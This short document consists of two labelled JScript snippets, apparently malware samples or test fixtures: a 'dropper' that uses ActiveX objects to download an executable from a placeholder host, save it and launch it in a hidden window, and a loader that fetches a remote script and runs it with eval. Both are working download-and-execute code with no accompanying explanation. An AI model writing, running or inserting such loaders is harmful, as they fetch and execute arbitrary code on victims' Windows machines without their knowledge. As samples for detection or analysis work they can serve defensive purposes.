JS_DROPPER.plain:
var http = new ActiveXObject("MSXML2.XMLHTTP");
http.open("GET", "https://files.example.invalid/a.exe", false);
http.send();
var stream = new ActiveXObject("ADODB.Stream");
stream.Type = 1;
stream.Open();
stream.Write(http.responseBody);
stream.SaveToFile("a.exe", 2);
var shell = new ActiveXObject("WScript.Shell");
shell.Run("a.exe", 0, false);

JS_EVAL.plain:
var http = new ActiveXObject("MSXML2.XMLHTTP");
http.open("GET", "https://files.example.invalid/step.js", false);
http.send();
eval(http.responseText);

